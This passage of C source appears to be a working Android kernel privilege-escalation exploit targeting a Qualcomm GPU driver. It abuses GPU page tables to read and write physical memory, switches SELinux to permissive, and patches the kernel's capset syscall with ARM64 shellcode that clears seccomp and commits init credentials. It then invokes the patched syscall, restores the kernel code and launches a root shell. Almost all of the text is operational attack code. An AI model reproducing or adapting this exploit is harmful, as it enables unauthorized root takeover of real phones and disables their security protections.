            fprintf(stderr, "init_task.cred=%#lx real_cred=%#lx\n",
                    (unsigned long)rt_cred, (unsigned long)rt_rcred);
            if (rt_cred != rt_rcred) { fprintf(stderr, "ROOT: cred mismatch, aborting\n"); exit(1); }
            int64_t slide = (int64_t)(rt_cred - LINK_INIT_CRED);
            fprintf(stderr, "slide=%#lx\n", (unsigned long)slide);
            init_cred_rt = rt_cred;
            commit_rt    = LINK_COMMIT + slide;
        }
        uint32_t first = RD(DO_CAPSET_PA);
        fprintf(stderr, "__do_sys_capset first dword = %#x %s\n", first,
                first == 0xd503233fu ? "(matches image - safe to patch)" : "(UNEXPECTED - aborting)");
        if (first != 0xd503233fu) { fprintf(stderr, "ROOT: aborting before writing\n"); exit(1); }

        uint32_t sc[13] = {
            0x58000040, 0x14000003, (uint32_t)init_cred_rt, (uint32_t)(init_cred_rt >> 32),
            0x58000041, 0x14000003, (uint32_t)commit_rt,    (uint32_t)(commit_rt >> 32),
            0xA9BF7BFD, 0xD63F0020, 0xA8C17BFD, 0x2A1F03E0, 0xD65F03C0,
        };
        uint32_t orig_sc[13] = {
            0xd503233f, 0xd10203ff, 0xf800865e, 0xa9047bfd, 0xa9055ff8, 0xa90657f6,
            0xa9074ff4, 0x910103fd, 0x90010d28, 0xf9448908, 0xaa0103f4, 0x910073e1, 0xaa0003f5,
        };
        /* SELinux must be Permissive for the trigger to survive, because commit_creds(&init_cred)
         * moves our task into the kernel SELinux domain and the transition kills the process under
         * Enforcing. Do the flip HERE, in the same process as the patch (no adb/shell overhead, fast
         * retries), and accept it only on the KERNEL's own view: /sys/fs/selinux/enforce == 0. */
        {
            uint32_t perm = 0x01010000u;
            int permissive = 0;
            for (int t = 0; t < 12 && !permissive; t++) {
                if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
                                      phyaddr, 0xaaa40b98ull, &perm, 1, tag++)) {
                    usleep(1500000); continue;
                }
                usleep(400000);
                FILE *f = fopen("/sys/fs/selinux/enforce", "r");
                if (f) { int v = -1; if (fscanf(f, "%d", &v) == 1 && v == 0) permissive = 1; fclose(f); }
                fprintf(stderr, "ROOT: permissive attempt %d -> enforce=%d\n", t, permissive);
                if (!permissive) usleep(1500000);
            }
            if (!permissive) {
                fprintf(stderr, "ROOT: SELinux will not go permissive - aborting BEFORE patching\n");
                exit(1);
            }
        }

        fprintf(stderr, "patching 52 bytes at 0x%lx with ONE bulk copy ...\n", (unsigned long)DO_CAPSET_PA);
        if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
                              phyaddr, DO_CAPSET_PA, sc, 13, tag++)) {
            fprintf(stderr, "ROOT: bulk patch command failed\n"); exit(1);
        }

        /* evict CPU caches so instruction fetch sees DRAM */
        {
            size_t n = (size_t)128 << 20;
            volatile char *t = (volatile char *)malloc(n);
            if (t) { for (size_t i = 0; i < n; i += 64) t[i] = (char)i; free((void *)t); }
            fprintf(stderr, "cache evicted (%zu MB)\n", n >> 20);
        }
        errno = 0;
        long r = syscall(SYS_capset, (void *)0, (void *)0);
        fprintf(stderr, "capset() returned %ld errno=%d\n", r, errno);
        fprintf(stderr, "AFTER: uid=%d euid=%d\n", getuid(), geteuid());

        /* While we are still root, run the proof command as a child (fork+wait, NOT exec, so this
         * process survives to restore the text). The child inherits our root credentials. */
        const char *rex = getenv("CHEESE_ROOT_EXEC");
        if (rex && getuid() == 0) {
            fprintf(stderr, "ROOT: running proof as root: %s\n", rex);
            fflush(stderr);
            pid_t pid = fork();
            if (pid == 0) {
                execl("/system/bin/sh", "sh", "-c", rex, (char *)NULL);
                _exit(127);
            } else if (pid > 0) {
                int st = 0; waitpid(pid, &st, 0);
                fprintf(stderr, "ROOT: proof finished (status %d)\n", st);
            } else {
                fprintf(stderr, "ROOT: fork failed\n");
            }
        }

        if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
                              phyaddr, DO_CAPSET_PA, orig_sc, 13, tag++))
            fprintf(stderr, "ROOT: RESTORE FAILED (reboot will clear)\n");
        else
            fprintf(stderr, "kernel text restored (one bulk copy)\n");
        {
            uint32_t enf = 0x01010001u;
            cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
                              phyaddr, 0xaaa40b98ull, &enf, 1, tag++);
        }
        fprintf(stderr, "ROOT RESULT: uid=%d %s\n", getuid(), getuid() == 0 ? "*** ROOT ACHIEVED ***" : "(not root)");
        exit(0);
    }

    if (getenv("CHEESE_CMD_SELFTEST")) {
        /* Is the write failing because the SMMU cached the translation of the VA page the setup
         * read used? Compare writing through that VA page (extra=0) vs a fresh one (extra=2). */
        uint8_t *vp = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (int i = 0; i < 4096; i += 4) *(uint32_t *)(vp + i) = 0xAAAAAAAAu;
        mlock(vp, PAGE_SIZE);
        uint64_t vpa = leak_phys_page(vp);
        sync_cache_to_gpu(vp, vp + PAGE_SIZE);
        fprintf(stderr, "CMDTEST victim pa=0x%lx ; table pa=0x%lx\n", vpa, phyaddr);

        struct { const char *name; int extra; uint64_t page; uint32_t off, val; } t[4] = {
            { "victim, VApage used by setup (e=0)", 0, 0, 0x080, 0xdead0001u },
            { "victim, FRESH VApage        (e=2)", 2, 0, 0x0C0, 0xdead0002u },
            { "table,  VApage used by setup (e=0)", 0, 1, 0x500, 0xdead0003u },
            { "table,  FRESH VApage        (e=2)", 2, 1, 0x600, 0xdead0004u },
        };
        for (int i = 0; i < 4; i++) {
            uint64_t pg = t[i].page ? phyaddr : vpa;
            uint64_t ta = pg + t[i].off;
            uint32_t tv = t[i].val;
            g_write_va_extra = t[i].extra;
            g_write_preamble = 0;
            g_write_via_copy = 0;
            if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, ta & ~0xfffull)) {
                fprintf(stderr, "CMDTEST %s: setup failed\n", t[i].name); continue;
            }
            if (t[i].page) *(uint32_t *)((char *)target_physical_page + t[i].off) = 0x11111111u;
            sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
            g_marker = 0x7000 + i;
            int rc = DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr,
                             kFakeGpuAddr + 0x1100, /*write=*/true,
                             kFakeGpuAddr + (ta & 0xfff), 1, &tv);
            usleep(5000);
            uint32_t after; const char *how;
            if (t[i].page) {
                sync_cache_from_gpu((char *)target_physical_page + t[i].off,
                                    (char *)target_physical_page + t[i].off + 4);
                after = *(volatile uint32_t *)((char *)target_physical_page + t[i].off);
                how = "cpu";
            } else {
                after = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr,
                                          target_physical_page, phyaddr, ta, 0x7100 + i);
                how = "gpu";
            }
            fprintf(stderr, "CMDTEST %-36s rc=%d %s=0x%08x %s\n", t[i].name, rc, how, after,
                    (after == tv) ? "*** LANDED ***" : "(no)");
        }
        g_write_va_extra = 0;
        exit(0);
    }

    if (getenv("CHEESE_POKE")) {
        fprintf(stderr, "POKE read target=0x%lx value=0x%x\n",
                (unsigned long)target_read_physical_address, read_output);
        const char *wpa_s = getenv("CHEESE_WRITE_PA");
        if (wpa_s) {
            uint64_t wpa = strtoull(wpa_s, NULL, 0);
            const char *wv_s = getenv("CHEESE_WRITE_VAL");
            uint32_t wval = (uint32_t)strtoull(wv_s ? wv_s : "0", NULL, 0);
            /* Losing the TTBR0 race faults, and KGSL throttles a context after 3 faults in 3 s
             * (later commands then fail with EPERM). So: retry on a FRESH context each attempt,
             * and pace attempts. Verify every write by readback. */
            int verified = 0;
            uint32_t back = 0;
            for (int attempt = 0; attempt < 4 && !verified; attempt++) {
                uint32_t ctx = ctx_id;
                if (attempt > 0) {
                    if (kgsl_ctx_create0(fd, &ctx)) { fprintf(stderr, "POKE: ctx create failed\n"); break; }
                }
                int ok = 1;
                if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, wpa & ~0xfffull)) ok = 0;
                if (ok) {
                    sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
                    g_marker = 0x4000 + attempt;
                    if (DoWrite(fd, ctx, payload_buf, payload_gpuaddr, phyaddr,
                                kFakeGpuAddr + 0x1100, /*write=*/true,
                                kFakeGpuAddr + (wpa & 0xfffull), 1, &wval)) ok = 0;
                }
                if (ok) {
                    usleep(5000);
                    back = cheese_read_dword(fd, ctx, payload_buf, payload_gpuaddr,
                                             target_physical_page, phyaddr, wpa, 0x5000 + attempt);
                    if (back == wval) verified = 1;
                }
                if (attempt > 0) kgsl_ctx_destroy(fd, ctx);
                if (!verified) usleep(1200000);   /* pace: stay under the 3-faults/3s throttle */
            }
        fprintf(stderr, "POKE write 0x%08x -> 0x%lx : %s (readback 0x%08x)\n",
                    wval, (unsigned long)wpa, verified ? "VERIFIED" : "FAILED", back);
        }
        exit(0);
    }

    if (getenv("CHEESE_PROBE_ONLY") || getenv("CHEESE_SELFTEST")) {
        fprintf(stderr, "READBACK target=0x%lx value=0x%x %s\n",
                target_read_physical_address, read_output,
                (read_output == 0xc0ffee11u) ? "SELFTEST-PASS" : "");
        exit(0);
    }

    if (read_output == 0) {
        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
        return 1;
    }

    // https://developer.arm.com/documentation/ddi0596/2020-12/Index-by-Encoding/Branches--Exception-Generating-and-System-instructions
    uint32_t branch_off = read_output & ((1 << 26) - 1);
    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);

    uint64_t swapper_pg_dir_off;
    if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
        swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
    } else {
        // there's up to 0xf000 bytes of padding between the end of primary_entry and the start of primary_entry
        // we need to check all 16 places where swapper_pg_dir could be. Do one read of all 16 locations.
        // look for idmap_pg_dir's 2nd entry, which is a table entry for 0x80000000-0xc0000000
        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0xf000 /* max amount of padding */ - 0x6000 /* end to idmap_pg_dir */ + 2*sizeof(uint64_t);
        fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
        if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + 0x2000 + (target_read_physical_address & 0xfffull), 16, NULL)) {
            fprintf(stderr, "Can't do second read\n");
            return 1;
        }
        sleep(1);
        sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
        uint32_t second_read_sentinel = *(uint32_t*)(target_physical_page + 0x100);
        fprintf(stderr, "second read sentinel: %x\n", second_read_sentinel);
        if (second_read_sentinel != 0x41414141) {
            fprintf(stderr, "Fail\n");
            return 1;
        }

        for (int i = 15; i >= 0; i--) {
            read_output = *(uint32_t*)(target_physical_page + 0x104 + i*4);
            fprintf(stderr, "second read value: %x\n", read_output);
            if (read_output == 0x45454545) {
                fprintf(stderr, "Fail\n");
                return 1;
            }
            if ((read_output & 0xfff) == 0x3) {
                uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
                swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
                fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);
                break;
            }
        }
        if (!swapper_pg_dir_off) {
            fprintf(stderr, "can't find swapper_pg_dir\n");
            return 1;
        }
        sleep(1);
    }

    uint64_t target_write_physical_address = kernel_physical_memory_region + swapper_pg_dir_off + (kKernelPageTableEntry * sizeof(uint64_t));

    fprintf(stderr, "writing: %lx = %lx\n", target_write_physical_address, tramp_pte_value);

    if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
        return 1;
    }
    sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/true, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
        fprintf(stderr, "Can't do second write\n");
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
    uint32_t second_write_sentinel = *(uint32_t*)(target_physical_page + 0x100);
    fprintf(stderr, "second write sentinel: %x\n", second_write_sentinel);
    if (second_write_sentinel != 0x41414141) {
        fprintf(stderr, "second write failed\n");
    }

    /* The PTE was written via the GPU (non-cacheable route). The CPU may still hold
     * the stale page-table line in its caches, which would mask the new entry during
     * its own page-table walk. Thrash the caches so the walk re-reads from DRAM. */
    {
        size_t thrash_len = (size_t)64 << 20;
        volatile char *thrash = (volatile char *)malloc(thrash_len);
        if (thrash) {
            for (size_t i = 0; i < thrash_len; i += 64) thrash[i] = (char)i;
            free((void *)thrash);
            fprintf(stderr, "cache thrash done (%zu MB)\n", thrash_len >> 20);
        } else {
            fprintf(stderr, "cache thrash alloc failed\n");
        }
    }

    // we don't need these anymore...
    for (int i = 0; i < NPBUFS; i++) {
        munmap(pbufs[i], pbuf_len);
        pbufs[i] = NULL;
    }
    return 0;
}

#if 0
int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physical_address, uint32_t count, uint32_t* values) {
    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
        return 1;
    }
    // really stupid cache flush:
    memset(cheese->garbage, 0x1, kGarbageSize);
    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, cheese->phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + (target_write_physical_address & 0xfffull), count, values)) {
        return 1;
    }
    usleep(100000);
    memset(cheese->garbage, 0x1, kGarbageSize);
    volatile uint32_t* target_marker = cheese->target_physical_page + 0x100;
    for (int i = 0; i < 20; i++) {
        fprintf(stderr, "%x\n", target_marker[0]);
        if (target_marker[0] == 0x41414141) {
            return 0;
        }
        fprintf(stderr, "still waiting: %d\n", i);
        usleep(100000);
        memset(cheese->garbage, 0x1, kGarbageSize);
    }
    return 1;
}
#endif

int cheese_shutdown(struct cheese_gpu_rw* cheese) {
    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(cheese->fd);
    return 0;
}

#define KALLSYMS_LOOKUP_INCLUDE
#include "kallsyms_lookup.c"

static void stupid_memcpy(void* dst, const void* src, size_t count) {
    char* d = dst;
    const char* s = src;
    for (size_t c = 0; c < count; c++) {
        d[c] = s[c];
    }
}

void stupid_setexeccon(const char* con) {
    // don't want to build libselinux just for this...
    int fd = open("/proc/thread-self/attr/exec", O_RDWR|O_CLOEXEC);
    write(fd, con, strlen(con) + 1);
    close(fd);
}

static void maybe_retry(char** argv) {
    char* attempt = getenv("CHEESE_ATTEMPT");
    int attempt_num = attempt? atoi(attempt): 0;
    int new_attempt = attempt_num + 1;
    if (new_attempt < sizeof(gPhyAddrs) / sizeof(*gPhyAddrs)) {
        char new_attempt_str[10];
        snprintf(new_attempt_str, sizeof(new_attempt_str), "%d", new_attempt);
        setenv("CHEESE_ATTEMPT", new_attempt_str, true);
        execv("/proc/self/exe", argv);
    }
}


static void cheese_segv(int sig, siginfo_t *si, void *ctx) {
    (void)sig; (void)ctx;
    fprintf(stderr, "SIGSEGV addr=%p code=%d (%s)\n", si->si_addr, si->si_code,
            si->si_code == SEGV_MAPERR ? "MAPERR = no translation (walk saw invalid entry)" :
            si->si_code == SEGV_ACCERR ? "ACCERR = translation exists, permission denied" : "other");
    fflush(stderr);
    _exit(3);
}

int main(int argc, char** argv) {
    if (getenv("CHEESE_DEREF_TEST")) {
        struct sigaction sa; memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = cheese_segv; sa.sa_flags = SA_SIGINFO;
        sigaction(SIGSEGV, &sa, NULL);
        uint64_t va = 0xffffff8780000000ull + 0x28000000ull + 0x38ull;  /* -> physical 0xa8000038 */
        fprintf(stderr, "deref test: VA %#lx expects physical 0xa8000038\n", (unsigned long)va);
        fflush(stderr);
        uint32_t v = *(volatile uint32_t *)va;
        fprintf(stderr, "DEREF OK value=%#x %s\n", v, v == 0x644d5241u ? "ARM64-MAGIC-VISIBLE" : "unexpected");
        return 0;
    }
    g_level1_dcache_size = tu_get_l1_dcache_size();
#if 1
    if (!getenv("CHEESE_SKIP_GPU")) {
        struct cheese_gpu_rw cheese = {};
        if (cheese_gpu_rw_setup(&cheese)) {
            fprintf(stderr, "can't get GPU r/w\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }
    }
#endif
    // now check ksma...
    fprintf(stderr, "about to ksma...\n");
    void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
    uint64_t ksma_physical_base = 0x80000000;
    //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
    uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
    fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
    uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
    uint64_t kernel_size = *kernel_size_ptr;
    void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;

    void* kernel_copy_buf = malloc(kernel_size);
    memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
    if (getenv("CHEESE_DUMP_KERNEL")) {
        FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
        fwrite(kernel_copy_buf, 1, kernel_size, f);
        fclose(f);
    }

    struct cheese_kallsyms_lookup kallsyms_lookup;
    if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
        return 1;
    }

    const bool force_manual_patchfinder = false;

    // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
    uint64_t kernel_virtual_base = kallsyms_lookup.text_base;
    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
    if (force_manual_patchfinder || !kernel_selinux_state_addr) {
        kernel_selinux_state_addr = cheese_lookup_selinux_state(&kallsyms_lookup);
    }
    bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
    fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
    *kernel_selinux_state_enforcing_ptr = false;
    fprintf(stderr, "set selinux enforcing ptr...\n");
    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + sizeof(bool));

    uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
    if (force_manual_patchfinder || !init_cred_addr) {
        init_cred_addr = cheese_lookup_init_cred(&kallsyms_lookup);
    }
    uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");

#define LO_DWORD(a) (a & 0xffffffff)
#define HI_DWORD(a) (a >> 32)

    // https://www.longterm.io/cve-2020-0423.html
    uint32_t shellcode[] = {
#if 1
        // clear Seccomp (apps need this; adb doesn't)
        // current->thread_info.flags &= ~(1 << TIF_SECCOMP)
        0xd5384100, // mrs x0, sp_el0
        0xf9400001, // ldr x1, [x0]
        0x9274f821, // and x1, x1, #0xfffffffffffff7ff
        0xf9000001, // str x1, [x0]
        // current->seccomp = (struct seccomp){};
        0xf904181f, // str xzr, [x0, #0x830]
        0xf9041c1f, // str xzr, [x0, #0x838]
        // (yes this leaks a seccomp filter, but eh...)
#endif
        // commit_creds(init_cred)
        0x58000040, // ldr x0, .+8
        0x14000003, // b   .+12
        LO_DWORD(init_cred_addr),
        HI_DWORD(init_cred_addr),
        0x58000041, // ldr x1, .+8
        0x14000003, // b   .+12
        LO_DWORD(commit_creds_addr),
        HI_DWORD(commit_creds_addr),
        0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
        0xD63F0020, // blr x1
        0xA8C17BFD, // ldp x29, x30, [sp], #0x10

        0x2A1F03E0, // mov w0, wzr
        0xD65F03C0, // ret
    };

    uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
    char* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);

    /* Saving sys_capset current code */
    uint8_t sys_capset[sizeof(shellcode)];
    fprintf(stderr, "save...\n");
    stupid_memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
    /* Patching sys_capset with our shellcode */
    fprintf(stderr, "patch...\n");
    stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));

    // https://developer.arm.com/documentation/101430/0102/Functional-description/L1-memory-system/About-the-L1-memory-system/L1-instruction-side-memory-system
    // "behaves as a PIPT cache" - flushing this will flush all copies sharing same physical memory
    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(shellcode));

    fprintf(stderr, "call...\n");
    /* Calling our patched version of sys_capset */
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wnonnull"
    int err = capset(NULL, NULL);
    fprintf(stderr, "called...\n");
    #pragma clang diagnostic pop
    if (err) {
        fprintf(stderr, "capset returned %d\n", err);
        return 1;
    }
    fprintf(stderr, "restore...\n");
    /* Restoring sys_capset */
    stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(sys_capset));
    fprintf(stderr, "restored...\n");
    if (getuid() != 0) {
        fprintf(stderr, "failed to get root - rerun?\n");
        return 1;
    }

    stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
    char* const just_sh[] = {"sh", NULL};
    char* const* new_argv = argc > 1? argv + 1: just_sh;

    execvp(new_argv[0], new_argv);
    fprintf(stderr, "can't exec?\n");

    return 0;
}
